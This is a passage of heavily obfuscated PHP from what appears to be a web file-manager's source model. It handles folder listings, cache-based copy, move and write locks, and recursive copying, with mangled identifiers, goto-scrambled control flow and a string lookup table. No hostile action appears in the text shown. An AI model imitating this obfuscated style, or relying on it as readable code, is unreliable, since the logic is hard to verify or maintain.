$Aôù…áŠÃ‰ = explode($Aí»¸îÛÈà[8], trim($bœÂºæ’ì‹[$Aí»¸îÛÈà[468]], $Aí»¸îÛÈà[8])); $c›»å„¿í = implode($Aí»¸îÛÈà[8], array_slice($Aôù…áŠÃ‰, 2)); $bœÂºæ’ì‹[$Aí»¸îÛÈà[468]] = $Aí»¸îÛÈà[8] . LNG($Aí»¸îÛÈà[471]) . $Aí»¸îÛÈà[8] . ltrim($c›»å„¿í, $Aí»¸îÛÈà[8]); goto cù÷Äïç‚‡; fé¸ó²Çáõ: } protected function _listAppendPathRoot(&$eÎ››Íê…, $Dˆ³‹â£ö›) { $Bˆë³é =& $_SERVER[¦·]; $a•Å™×ƒĞ‘ = $Bˆë³é[33]; if ($eÎ››Íê…[$Bˆë³é[371]] == self::TYPE_USER) { if (defined($Bˆë³é[427]) && $eÎ››Íê…[$Bˆë³é[458]] == USER_ID) { $a•Å™×ƒĞ‘ = LNG($Bˆë³é[475]); if (!$Dˆ³‹â£ö›) { $eÎ››Íê…[$Bˆë³é[28]] = $a•Å™×ƒĞ‘; } } else { $bÌÅùºš×» = Model($Bˆë³é[476])->getInfoSimple($eÎ››Íê…[$Bˆë³é[458]]); $a•Å™×ƒĞ‘ = LNG($Bˆë³é[477]) . $Bˆë³é[157] . $bÌÅùºš×»[$Bˆë³é[28]] . $Bˆë³é[478]; } } else { if ($eÎ››Íê…[$Bˆë³é[371]] == self::TYPE_GROUP) { $bÌÅùºš×» = Model($Bˆë³é[460])->getInfoSimple($eÎ››Íê…[$Bˆë³é[458]]); $a•Å™×ƒĞ‘ = $bÌÅùºš×»[$Bˆë³é[28]]; } else { if ($eÎ››Íê…[$Bˆë³é[371]] == self::TYPE_SYSTEM) { $bÌÅùºš×» = $this->sourceInfo($Dˆ³‹â£ö›[0], !0); $a•Å™×ƒĞ‘ = $bÌÅùºš×»[$Bˆë³é[28]]; } } } $a•Å™×ƒĞ‘ = $a•Å™×ƒĞ‘ ? $Bˆë³é[8] . $a•Å™×ƒĞ‘ . $Bˆë³é[8] : $Bˆë³é[8]; return $a•Å™×ƒĞ‘; } protected function _listAppendUser(&$fŠ‹Ú®³Ò) { goto cÄÈèÁ‚‹õ; cÄÈèÁ‚‹õ: $F­à˜¾İ´ =& $_SERVER[¦·]; $dÚÅæè·Å = array_to_keyvalue($fŠ‹Ú®³Ò, $F­à˜¾İ´[33], $F­à˜¾İ´[378]); $cÀçÀë§…ô = array_to_keyvalue($fŠ‹Ú®³Ò, $F­à˜¾İ´[33], $F­à˜¾İ´[379]); goto bÈ‚„÷ºÕß; bÈ‚„÷ºÕß: $aéêî”¨Â = array_merge($dÚÅæè·Å, $cÀçÀë§…ô); $cÊÀ§†ÔÍˆ = Model($F­à˜¾İ´[479])->userListInfo($aéêî”¨Â); foreach ($fŠ‹Ú®³Ò as &$C‰“ÜÁ«¥Ğ) { $A¶ô¼¸«ç‚ = $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[378]]; $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[378]] = $cÊÀ§†ÔÍˆ[$A¶ô¼¸«ç‚] ? $cÊÀ§†ÔÍˆ[$A¶ô¼¸«ç‚] : !1; $A¶ô¼¸«ç‚ = $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[379]]; $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[379]] = $cÊÀ§†ÔÍˆ[$A¶ô¼¸«ç‚] ? $cÊÀ§†ÔÍˆ[$A¶ô¼¸«ç‚] : !1; if (isset($C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]]) && $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]][$F­à˜¾İ´[480]]) { $C½ˆÌ ƒÎ = $GLOBALS[$F­à˜¾İ´[6]][$F­à˜¾İ´[84]][$F­à˜¾İ´[481]]; if ($C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]][$F­à˜¾İ´[482]] <= time() - $C½ˆÌ ƒÎ) { $this->metaSet($C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[369]], $F­à˜¾İ´[480], null); $this->metaSet($C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[369]], $F­à˜¾İ´[482], null); unset($C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]][$F­à˜¾İ´[480]]); continue; } $D‚À…¼‚¿ë = $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]][$F­à˜¾İ´[480]]; $C‰“ÜÁ«¥Ğ[$F­à˜¾İ´[417]][$F­à˜¾İ´[483]] = Model($F­à˜¾İ´[479])->getInfoSimpleOuter($D‚À…¼‚¿ë); } } goto A²”µ™šœí; A²”µ™šœí: unset($C‰“ÜÁ«¥Ğ); goto e¯ôÒ¶™—õ; e¯ôÒ¶™—õ: } public function parentLevelArray($FÒ¡Ğ¤ŸÉ…) { $C›•·øİ´ =& $_SERVER[¦·]; $FÒ¡Ğ¤ŸÉ… = explode($C›•·øİ´[47], trim($FÒ¡Ğ¤ŸÉ…, $C›•·øİ´[47])); return array_remove_value($FÒ¡Ğ¤ŸÉ…, $C›•·øİ´[470]); } public function listAll($dÙÏ£Š ­Š) { goto d»‰ôÂ˜±; eÊ÷—éÁğ: $fª–±ä§·Î = array_to_keyvalue($fª–±ä§·Î, $E¨šñÇ„©[369]); $cÉ“áÒİ  = "\x2f{$bĞ§›ŸÍ¦ì[$E¨šñÇ„©[28]]}\x2f"; $cÉ“áÒİ  = $cÉ“áÒİ  == $E¨šñÇ„©[469] ? $E¨šñÇ„©[8] : $cÉ“áÒİ ; goto Dİ‹Â©×Ç»; B·†Óàò‚: $this->_listAppendAuth($fª–±ä§·Î); $this->_listAppendUser($fª–±ä§·Î); $this->_listAppendPath($fª–±ä§·Î); goto eÊ÷—éÁğ; d»‰ôÂ˜±: $E¨šñÇ„© =& $_SERVER[¦·]; $bĞ§›ŸÍ¦ì = $this->sourceInfo($dÙÏ£Š ­Š); $f™íã‘¾ƒ³ = array($E¨šñÇ„©[484] => array($E¨šñÇ„©[485], $bĞ§›ŸÍ¦ì[$E¨šñÇ„©[461]] . $dÙÏ£Š ­Š . $E¨šñÇ„©[486]), $E¨šñÇ„©[487] => 0); goto fâ“Í­„Ş; Dİ‹Â©×Ç»: $bÅŸÔÕ‡Å¹ = array(); foreach ($fª–±ä§·Î as $aŠáÓ¡šÀ¤ => $b—ì§“¢³ß) { goto D›‡§Ö‰; f˜¿‰“´ù: $eœï³¼ëóÕ = str_replace($E¨šñÇ„©[469], $E¨šñÇ„©[8], $eœï³¼ëóÕ); $eœï³¼ëóÕ = str_replace($E¨šñÇ„©[469], $E¨šñÇ„©[8], $eœï³¼ëóÕ); $côãÒÖˆ¥• = array($E¨šñÇ„©[387] => str_replace($E¨šñÇ„©[469], $E¨šñÇ„©[8], $eœï³¼ëóÕ), $E¨šñÇ„©[490] => intval($b—ì§“¢³ß[$E¨šñÇ„©[370]]), $E¨šñÇ„©[391] => $this->pathInfoFilter($b—ì§“¢³ß, !0)); goto f”Ù»Â°É; b¢¯•Šß•§: for ($DÙ×ºÒŠÕ = 0; $DÙ×ºÒŠÕ < count($EŒìî¢ëãº); $DÙ×ºÒŠÕ++) { $eœï³¼ëóÕ .= $fª–±ä§·Î[$EŒìî¢ëãº[$DÙ×ºÒŠÕ]][$E¨šñÇ„©[28]] . $E¨šñÇ„©[8]; } $eœï³¼ëóÕ .= $b—ì§“¢³ß[$E¨šñÇ„©[28]]; if ($b—ì§“¢³ß[$E¨šñÇ„©[370]]) { $eœï³¼ëóÕ .= $E¨šñÇ„©[8]; } goto f˜¿‰“´ù; D›‡§Ö‰: $EŒìî¢ëãº = $this->parentLevelArray($b—ì§“¢³ß[$E¨šñÇ„©[461]]); array_shift($EŒìî¢ëãº); $eœï³¼ëóÕ = $cÉ“áÒİ ; goto b¢¯•Šß•§; f”Ù»Â°É: if (!$b—ì§“¢³ß[$E¨šñÇ„©[370]]) { $côãÒÖˆ¥•[$E¨šñÇ„©[419]] = $b—ì§“¢³ß[$E¨šñÇ„©[419]]; $côãÒÖˆ¥•[$E¨šñÇ„©[491]] = $b—ì§“¢³ß[$E¨šñÇ„©[75]]; } $bÅŸÔÕ‡Å¹[] = $côãÒÖˆ¥•; goto dÑÇÕÊøÓ; dÑÇÕÊøÓ: } return $bÅŸÔÕ‡Å¹; goto d½ÃÎŠ©—Ş; fâ“Í­„Ş: $B˜¯Õ‡³å  = $E¨šñÇ„©[488]; $eßİ¬‘É‘Ù = "\x4c\105\106\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\137\x66\151\154\145\x20\x66\151\154\x65\x20\157\156\x20\163\x6f\165\162\143\x65\56\146\x69\x6c\145\x49\x44\40\x3d\40\x66\151\x6c\145\x2e\146\151\x6c\x65\111\104"; $fª–±ä§·Î = $this->alias($E¨šñÇ„©[489])->field($B˜¯Õ‡³å )->where($f™íã‘¾ƒ³)->join($eßİ¬‘É‘Ù)->select(); goto B·†Óàò‚; d½ÃÎŠ©—Ş: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($BÅ’‡“ÑÙ¹) { goto d·’œª§¿‹; e…„öŸ†è: $A¿«ÒÇ„£• = 1; $this->_lockEvent($BÅ’‡“ÑÙ¹, array($bŠßÆœ¨÷‹[493], $bŠßÆœ¨÷‹[494]), $A¿«ÒÇ„£•); $this->_lockParent($BÅ’‡“ÑÙ¹, array($bŠßÆœ¨÷‹[494]), $A¿«ÒÇ„£•); goto BÏ•·†Û»Õ; d·’œª§¿‹: $bŠßÆœ¨÷‹ =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $this->_lockCheck($bŠßÆœ¨÷‹[492], $BÅ’‡“ÑÙ¹); goto e…„öŸ†è; BÏ•·†Û»Õ: $this->_lockEvent($BÅ’‡“ÑÙ¹, array($bŠßÆœ¨÷‹[495], $bŠßÆœ¨÷‹[496]), $A¿«ÒÇ„£•); $this->_lockCheckEnd($bŠßÆœ¨÷‹[492], $BÅ’‡“ÑÙ¹); goto E¿çÄ¸ëÍ; E¿çÄ¸ëÍ: } public function lockCopyEnd($CÀÇ„¿àè±) { $Fàà—×Á =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $Bí¼×–°à = 0; $this->_lockEvent($CÀÇ„¿àè±, array($Fàà—×Á[493], $Fàà—×Á[494]), $Bí¼×–°à); $this->_lockParent($CÀÇ„¿àè±, array($Fàà—×Á[494]), $Bí¼×–°à); $this->_lockEvent($CÀÇ„¿àè±, array($Fàà—×Á[495], $Fàà—×Á[496]), $Bí¼×–°à); } public function lockWriteStart($fÍ¥÷¦¸, $F«ÚŸôöã‚ = '') { goto A¨âÛé¯«ì; A¨âÛé¯«ì: $bÌ‘òòïÍ =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $this->_lockCheck($bÌ‘òòïÍ[493], $fÍ¥÷¦¸); goto eôêÍÚò´ˆ; b×”¾î¬ë: $this->_lockParent($fÍ¥÷¦¸, array($bÌ‘òòïÍ[492], $bÌ‘òòïÍ[494]), $d¥ºÒñÇÈÑ); $this->_lockCheckEnd($bÌ‘òòïÍ[493], $fÍ¥÷¦¸); goto e±âª‚ïÆ; eôêÍÚò´ˆ: $d¥ºÒñÇÈÑ = 1; $this->_lockKey($bÌ‘òòïÍ[497] . $fÍ¥÷¦¸ . $bÌ‘òòïÍ[91] . $F«ÚŸôöã‚, $d¥ºÒñÇÈÑ); $this->_lockEvent($fÍ¥÷¦¸, array($bÌ‘òòïÍ[492], $bÌ‘òòïÍ[494]), $d¥ºÒñÇÈÑ); goto b×”¾î¬ë; e±âª‚ïÆ: } public function lockWriteEnd($b‰‹¦Ü½Šª, $a™çÅ¯ë‰¯ = '') { $B·ˆƒ‘³£á =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $eÎ‚…ˆ™µ¨ = 0; $this->_lockKey($B·ˆƒ‘³£á[497] . $b‰‹¦Ü½Šª . $B·ˆƒ‘³£á[91] . $a™çÅ¯ë‰¯, $eÎ‚…ˆ™µ¨); $this->_lockEvent($b‰‹¦Ü½Šª, array($B·ˆƒ‘³£á[492], $B·ˆƒ‘³£á[494]), $eÎ‚…ˆ™µ¨); $this->_lockParent($b‰‹¦Ü½Šª, array($B·ˆƒ‘³£á[492], $B·ˆƒ‘³£á[494]), $eÎ‚…ˆ™µ¨); } public function lockMoveStart($D²ÀµÒëÜ³) { goto f ÇˆøÉ Á; eÖÉŒ¨…¶: $this->_lockParent($D²ÀµÒëÜ³, array($eâŞÓ‘ğ‰Æ[492], $eâŞÓ‘ğ‰Æ[494]), $AÚ°ˆÅ›Ş); $this->_lockEvent($D²ÀµÒëÜ³, array($eâŞÓ‘ğ‰Æ[499], $eâŞÓ‘ğ‰Æ[495], $eâŞÓ‘ğ‰Æ[496]), $AÚ°ˆÅ›Ş); $this->_lockCheckEnd($eâŞÓ‘ğ‰Æ[494], $D²ÀµÒëÜ³); goto eÁê…ÕÏ°; A¡‡Ğ¥Ÿ’Å: $AÚ°ˆÅ›Ş = 1; $this->_lockKey($eâŞÓ‘ğ‰Æ[498] . $D²ÀµÒëÜ³, $AÚ°ˆÅ›Ş); $this->_lockEvent($D²ÀµÒëÜ³, array($eâŞÓ‘ğ‰Æ[492], $eâŞÓ‘ğ‰Æ[493]), $AÚ°ˆÅ›Ş); goto eÖÉŒ¨…¶; f ÇˆøÉ Á: $eâŞÓ‘ğ‰Æ =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $this->_lockCheck($eâŞÓ‘ğ‰Æ[494], $D²ÀµÒëÜ³); goto A¡‡Ğ¥Ÿ’Å; eÁê…ÕÏ°: } public function lockMoveEnd($F¦°¨í³œË) { goto có¬¹ÅË˜Ó; có¬¹ÅË˜Ó: $d÷†ŸË¤¸ =& $_SERVER[¦·]; if (!$this->allowLock()) { return; } $AÅòòòÖ‘… = 0; goto a‘ À¹àÁ®; a‘ À¹àÁ®: $this->_lockKey($d÷†ŸË¤¸[498] . $F¦°¨í³œË, $AÅòòòÖ‘…); $this->_lockEvent($F¦°¨í³œË, array($d÷†ŸË¤¸[492], $d÷†ŸË¤¸[493]), $AÅòòòÖ‘…); $this->_lockParent($F¦°¨í³œË, array($d÷†ŸË¤¸[492], $d÷†ŸË¤¸[494]), $AÅòòòÖ‘…); goto AÜ°Õ†ñ¤; AÜ°Õ†ñ¤: $this->_lockEvent($F¦°¨í³œË, array($d÷†ŸË¤¸[499], $d÷†ŸË¤¸[495], $d÷†ŸË¤¸[496]), $AÅòòòÖ‘…); goto b‹÷ÆîÑ¬ğ; b‹÷ÆîÑ¬ğ: } private function _lockCheck($E…¹‘–‰¬§, $Cõ­ëˆ­…) { goto cÕèˆêœ; FÀá ÖÑùÈ: CacheLock::setErrorMsg($bÁ÷ˆî—†Í[157] . htmlspecialchars($A­ÖÄÚÖÏ‹[$bÁ÷ˆî—†Í[28]]) . $bÁ÷ˆî—†Í[478] . $EµƒÀÈ– Ì); $this->_lockKey($F»îÖŸ–‰ö, 1); $this->_lockKey($F»îÖŸ–‰ö, 0); goto d£É±êáÀ¶; cÕèˆêœ: $bÁ÷ˆî—†Í =& $_SERVER[¦·]; $A­ÖÄÚÖÏ‹ = $this->sourceInfo($Cõ­ëˆ­…); $F»îÖŸ–‰ö = $E…¹‘–‰¬§ . $bÁ÷ˆî—†Í[91] . $Cõ­ëˆ­…; goto bÛ‹±‰«½‡; bÛ‹±‰«½‡: $this->_lockTimeStart[$F»îÖŸ–‰ö] = timeFloat(); if (!is_array($A­ÖÄÚÖÏ‹)) { return; } $EµƒÀÈ– Ì = LNG($bÁ÷ˆî—†Í[500]); goto FÀá ÖÑùÈ; d£É±êáÀ¶: $f¨ñ–¯Ê²Ó = array_reverse($this->parentLevelArray($A­ÖÄÚÖÏ‹[$bÁ÷ˆî—†Í[461]])); foreach ($f¨ñ–¯Ê²Ó as $dƒÍ£ï‡Œ) { $F»îÖŸ–‰ö = $E…¹‘–‰¬§ . $bÁ÷ˆî—†Í[501] . $dƒÍ£ï‡Œ; if (CacheLock::lockGet($bÁ÷ˆî—†Í[502] . $F»îÖŸ–‰ö)) { $A­ÖÄÚÖÏ‹ = $this->sourceInfo($dƒÍ£ï‡Œ); CacheLock::setErrorMsg($bÁ÷ˆî—†Í[157] . htmlspecialchars($A­ÖÄÚÖÏ‹[$bÁ÷ˆî—†Í[28]]) . $bÁ÷ˆî—†Í[478] . $EµƒÀÈ– Ì); $this->_lockKey($F»îÖŸ–‰ö, 1); $this->_lockKey($F»îÖŸ–‰ö, 0); } } goto cÅ‚‹·ŞœÜ; cÅ‚‹·ŞœÜ: } private function _lockCheckEnd($DÇõ·†â, $FŠÉšŸ¾´´) { goto EŠâƒÖÚÁÎ; c¼…öÀš¸”: if ($bç®Óì²¡Î > 0.5) { unset(self::$cacheSourceInfo[$FÕ†Æ±Ô‰Ç[410] . $FŠÉšŸ¾´´]); } $aÛõ—÷‘¹õ = $this->sourceInfo($FŠÉšŸ¾´´); if (!$aÛõ—÷‘¹õ) { show_json(LNG($FÕ†Æ±Ô‰Ç[101]), !1); } goto båŸìÈ†—; A‡Á‘àŒô‘: if (!isset($this->_lockTimeStart[$EôŞ˜Ã ¬à])) { return; } $bç®Óì²¡Î = timeFloat() - $this->_lockTimeStart[$EôŞ˜Ã ¬à]; unset($this->_lockTimeStart[$EôŞ˜Ã ¬à]); goto c¼…öÀš¸”; EŠâƒÖÚÁÎ: $FÕ†Æ±Ô‰Ç =& $_SERVER[¦·]; $EôŞ˜Ã ¬à = $DÇõ·†â . $FÕ†Æ±Ô‰Ç[91] . $FŠÉšŸ¾´´; CacheLock::setErrorMsg($FÕ†Æ±Ô‰Ç[361]); goto A‡Á‘àŒô‘; båŸìÈ†—: } private function _lockParent($cö÷ĞóéÜ, $FöÛ„Ôè ‡, $EÒƒÉÇµ†Ÿ) { if (!$this->autoLockSet) { return; } $B²ÄæŒÊ¾İ = $this->sourceInfo($cö÷ĞóéÜ); if (!is_array($B²ÄæŒÊ¾İ)) { return; } $C£…õŠÃÃ… = array_reverse($this->parentLevelArray($B²ÄæŒÊ¾İ[$_SERVER[¦·][461]])); foreach ($C£…õŠÃÃ… as $a±çåø­·’) { $this->_lockEvent($a±çåø­·’, $FöÛ„Ôè ‡, $EÒƒÉÇµ†Ÿ); } } private function _lockEvent($eäŒ„à¤’Ñ, $Fá“…Å‰®æ, $d¹³ãíï») { $eó·¤ïëÓ… =& $_SERVER[¦·]; if (!$this->autoLockSet) { return; } foreach ($Fá“…Å‰®æ as $B÷§ÓŒÀƒ¾) { $B—÷¬É™ÍÂ = $B÷§ÓŒÀƒ¾ . $eó·¤ïëÓ…[91] . $eäŒ„à¤’Ñ; if ($d¹³ãíï» && CacheLock::lockGet($eó·¤ïëÓ…[502] . $B—÷¬É™ÍÂ)) { continue; } $this->_lockKey($B—÷¬É™ÍÂ, $d¹³ãíï»); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dÏ÷Ÿ¥»¼É, $dëáöôˆ† = 1) { $cÑÎ¸´’‹Ñ = $_SERVER[¦·][502] . md5($dÏ÷Ÿ¥»¼É); if ($dëáöôˆ†) { if (isset(self::$_lockItemArr[$cÑÎ¸´’‹Ñ])) { return; } self::$_lockItemArr[$cÑÎ¸´’‹Ñ] = 1; CacheLock::lock($cÑÎ¸´’‹Ñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$cÑÎ¸´’‹Ñ])) { return; } unset(self::$_lockItemArr[$cÑÎ¸´’‹Ñ]); CacheLock::unlock($cÑÎ¸´’‹Ñ); } } public function isParentOf($dÌÁÅĞ×, $EßİŞ£ÉÕÄ) { goto dµ¶£‰šª”; fŒâ£³“: return $a’õÈÃ‰å´; goto EÙŠ¹÷ÍÛ; EÀë—«‚÷ø: $E°ğ¥˜ğ = $aÎéáÏœÒ‹[$fÖíÇ¥’‡²[461]] . $aÎéáÏœÒ‹[$fÖíÇ¥’‡²[369]] . $fÖíÇ¥’‡²[47]; $c¶‹ñ’Ç¯ñ = $b™¥¸äŸµ[$fÖíÇ¥’‡²[461]] . $b™¥¸äŸµ[$fÖíÇ¥’‡²[369]] . $fÖíÇ¥’‡²[47]; $a’õÈÃ‰å´ = strpos($c¶‹ñ’Ç¯ñ, $E°ğ¥˜ğ) === 0; goto fŒâ£³“; dµ¶£‰šª”: $fÖíÇ¥’‡² =& $_SERVER[¦·]; $aÎéáÏœÒ‹ = $this->sourceInfo($dÌÁÅĞ×); $b™¥¸äŸµ = $this->sourceInfo($EßİŞ£ÉÕÄ); goto EÀë—«‚÷ø; EÙŠ¹÷ÍÛ: } private $targetIsDelete = 0; public function copy($DÖËŒ×æÜÒ, $e¥Š··›³‚, $Fõ„†ï×ø¹ = REPEAT_REPLACE, $DÜÖÈ÷ó÷Ğ = '') { goto D¯®â©´™·; dÓˆ°ó½…¨: $this->lockCopyStart($DÖËŒ×æÜÒ); $this->lockWriteStart($e¥Š··›³‚, $D›¢ÖÑñó­); $bå·…Õªù = array($DÑï’‚Œˆ¼[503] => array(), $DÑï’‚Œˆ¼[504] => array(), $DÑï’‚Œˆ¼[505] => array()); goto e™Ÿƒ†‚¥´; E§õçŸ–Æñ: $this->updateModifyTime($e¥Š··›³‚); return $b†‘ÆğÃÕ˜; goto d“¼‚ñ´³â; c¥åİ“®ŠÆ: $this->saveAll($bå·…Õªù[$DÑï’‚Œˆ¼[505]]); Model($DÑï’‚Œˆ¼[167])->linkAdd($bå·…Õªù[$DÑï’‚Œˆ¼[503]]); $this->folderSizeReset($e¥Š··›³‚); goto E§õçŸ–Æñ; e™Ÿƒ†‚¥´: $this->targetIsDelete = intval($EÖÂ”“È‚ó[$DÑï’‚Œˆ¼[397]]); $A³ÓŸ·ÛØˆ = $this->fileNameExistCache($e¥Š··›³‚, $EÖÂ”“È‚ó[$DÑï’‚Œˆ¼[28]]); $b†‘ÆğÃÕ˜ = $this->_copy($DÖËŒ×æÜÒ, $e¥Š··›³‚, $Fõ„†ï×ø¹, $bå·…Õªù, !0, $DÜÖÈ÷ó÷Ğ); goto F‹ö¶çšÍÀ; D¯®â©´™·: $DÑï’‚Œˆ¼ =& $_SERVER[¦·]; $EÖÂ”“È‚ó = $this->sourceInfo($DÖËŒ×æÜÒ); $fêÑÙ ¦ô¨ = $this->sourceInfo($e¥Š··›³‚); goto aÑ÷´´„ó; aÑ÷´´„ó: if (!$EÖÂ”“È‚ó || !$fêÑÙ ¦ô¨ || $fêÑÙ ¦ô¨[$DÑï’‚Œˆ¼[370]] != $DÑï’‚Œˆ¼[83]) { return !1; } if ($this->isParentOf($DÖËŒ×æÜÒ, $e¥Š··›³‚)) { return !1; } $D›¢ÖÑñó­ = $DÜÖÈ÷ó÷Ğ ? $DÜÖÈ÷ó÷Ğ : $EÖÂ”“È‚ó[$DÑï’‚Œˆ¼[28]]; goto dÓˆ°ó½…¨; F‹ö¶çšÍÀ: $this->_childrenListClear(); $this->lockCopyEnd($DÖËŒ×æÜÒ); $this->lockWriteEnd($e¥Š··›³‚, $D›¢ÖÑñó­); goto f±Õ·» ; f±Õ·» : if ($EÖÂ”“È‚ó[$DÑï’‚Œˆ¼[370]] == $DÑï’‚Œˆ¼[83] && $A³ÓŸ·ÛØˆ == $b†‘ÆğÃÕ˜) { $this->folderSizeResetChildren($A³ÓŸ·ÛØˆ); } Model($DÑï’‚Œˆ¼[506])->addAll($bå·…Õªù[$DÑï’‚Œˆ¼[504]], array(), !0); if ($A³ÓŸ·ÛØˆ != $b†‘ÆğÃÕ˜ || $EÖÂ”“È‚ó[$DÑï’‚Œˆ¼[370]] == $DÑï’‚Œˆ¼[83]) { Model($DÑï’‚Œˆ¼[507])->eventCopy($b†‘ÆğÃÕ˜); } goto c¥åİ“®ŠÆ; d“¼‚ñ´³â: } private function _copy($dÔ·äÀÅÖ…, $eä¥ÔŒÁÚ¡, $e±±™„ŠÍÑ, &$D´„êĞÜ², $C§õùéÒÓØ, $DÑÁ”Ñâ¢Ø = '') { goto e»³Âˆ Ì; dÖ£æÖçÉ‚: if (!$BšÂÔ•ãÉ) { return $this->_copyCreate($dÔ·äÀÅÖ…, $eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç, $D´„êĞÜ²); } $b†¨µŠø® = $BšÂÔ•ãÉ; if ($E —î¤ ·Ş) { if ($e±±™„ŠÍÑ == REPEAT_RENAME_FOLDER) { $aê¢¥Èê¡Ç = $this->fileNameAutoCache($eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç, $e±±™„ŠÍÑ, $E —î¤ ·Ş); $b†¨µŠø® = $this->_copyCreate($dÔ·äÀÅÖ…, $eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç, $D´„êĞÜ²); } else { $d²„Ğ†áÄÛ = $this->_childrenList($dÔ·äÀÅÖ…); foreach ($d²„Ğ†áÄÛ as $b´ŒÖ‹šÆ) { $this->_copy($b´ŒÖ‹šÆ[$e×œ•ÆÂ«‚[369]], $BšÂÔ•ãÉ, $e±±™„ŠÍÑ, $D´„êĞÜ², !1); } } } else { if ($e±±™„ŠÍÑ == REPEAT_RENAME || $e±±™„ŠÍÑ == REPEAT_RENAME_FOLDER) { $aê¢¥Èê¡Ç = $this->fileNameAutoCache($eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç, $e±±™„ŠÍÑ, $E —î¤ ·Ş); $b†¨µŠø® = $this->_copyCreate($dÔ·äÀÅÖ…, $eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç, $D´„êĞÜ²); } else { if ($e±±™„ŠÍÑ == REPEAT_REPLACE) { $BÚ¤ŠåÈö½ = $this->sourceInfoCache($BšÂÔ•ãÉ); $fÍ‡–â¡Ú = $this->fileHistory($BÚ¤ŠåÈö½, $bçÃ§ñ±‰©[$e×œ•ÆÂ«‚[419]], $bçÃ§ñ±‰©[$e×œ•ÆÂ«‚[77]]); if ($fÍ‡–â¡Ú) { $D´„êĞÜ²[$e×œ•ÆÂ«‚[503]][] = $bçÃ§ñ±‰©[$e×œ•ÆÂ«‚[419]]; } } else { if ($e±±™„ŠÍÑ == REPEAT_SKIP) { } } } Hook::trigger($e×œ•ÆÂ«‚[508], array($e×œ•ÆÂ«‚[509], $bçÃ§ñ±‰©, 0)); } goto c‘‰ùºËº—; e»³Âˆ Ì: $e×œ•ÆÂ«‚ =& $_SERVER[¦·]; $bçÃ§ñ±‰© = $this->sourceInfoCache($dÔ·äÀÅÖ…); $E —î¤ ·Ş = $bçÃ§ñ±‰©[$e×œ•ÆÂ«‚[370]] == $e×œ•ÆÂ«‚[83]; goto f‘ë–¸Ñ¸×; f‘ë–¸Ñ¸×: $aê¢¥Èê¡Ç = $DÑÁ”Ñâ¢Ø ? $DÑÁ”Ñâ¢Ø : $bçÃ§ñ±‰©[$e×œ•ÆÂ«‚[28]]; $BšÂÔ•ãÉ = $this->fileNameExistCache($eä¥ÔŒÁÚ¡, $aê¢¥Èê¡Ç); if ($C§õùéÒÓØ) { $this->_childrenAllMake($dÔ·äÀÅÖ…); if ($E —î¤ ·Ş && $BšÂÔ•ãÉ) { $this->_childrenAllMake($BšÂÔ•ãÉ); } } goto dÖ£æÖçÉ‚; c‘‰ùºËº—: return $b†¨µŠø®; goto eÁ¨¯·ã; eÁ¨¯·ã: } private function _copyCreate($B—«Ö÷Âˆ, $b…½™Ôè¦, $a‡ö¸ƒ†¨ª, &$AÀŠªÑ°ö) { goto EöÖ±·”””; b¡¢î¼ìô: $BÄŸ—º¼‹£ = $this->sourceInfo($a‰îéŞÚÜå); foreach ($EÇ™¶‹„£Õ as $BÕçĞßŸá¢) { $f•ˆÃ¿…æ = $this->_makeItemData($BÕçĞßŸá¢, $BÄŸ—º¼‹£, $BÕçĞßŸá¢[$D·¿èƒ³ô[28]]); $f•ˆÃ¿…æ[$D·¿èƒ³ô[461]] = $BÕçĞßŸá¢[$D·¿èƒ³ô[461]]; $b—Ã«†¼¨‹[] = $f•ˆÃ¿…æ; } $this->chunkEventSet($D·¿èƒ³ô[513], array($D·¿èƒ³ô[514], $F»¬§ÂêŸ’, $c¼ÌÉµ¥®â)); goto eœ¬¥½ÎøŸ; F°Ã¿’: $this->chunkEventSet($D·¿èƒ³ô[517], array($D·¿èƒ³ô[518], $F»¬§ÂêŸ’, $c¼ÌÉµ¥®â)); $this->saveAll($Cİ¯¯ŞÎ); return $a‰îéŞÚÜå; goto A—ØŒÎ÷ŸÜ; d­™¡¡ƒ: $a†À ‹¨îÕ[$B—«Ö÷Âˆ] = $a‰îéŞÚÜå; $BœŸ¦ßØ¡ = array(); $Cİ¯¯ŞÎ = array(); goto E«‚µ²‚®; EöÖ±·”””: $D·¿èƒ³ô =& $_SERVER[¦·]; $fğÖã²ŒÕ = $this->sourceInfoCache($B—«Ö÷Âˆ); $c¦ŒÈ‘å = $this->sourceInfoCache($b…½™Ôè¦); goto BÎŞÀ±Ğ™†; B¼ªÀÂÄÒš: if ($fğÖã²ŒÕ[$D·¿èƒ³ô[370]] != $D·¿èƒ³ô[83]) { $AÀŠªÑ°ö[$D·¿èƒ³ô[503]][] = $fğÖã²ŒÕ[$D·¿èƒ³ô[419]]; return $a‰îéŞÚÜå; } $EÇ™¶‹„£Õ = array(); $b—Ã«†¼¨‹ = array(); goto EÌÑ‚¸°ù; cš‰ÕùæÁŸ: $a‰îéŞÚÜå = $this->add($F»¬§ÂêŸ’); $eö‰¿Úß° = array($D·¿èƒ³ô[369] => $a‰îéŞÚÜå, $D·¿èƒ³ô[28] => $a‡ö¸ƒ†¨ª); $this->_copyApplyMeta($eö‰¿Úß°, $AÀŠªÑ°ö); 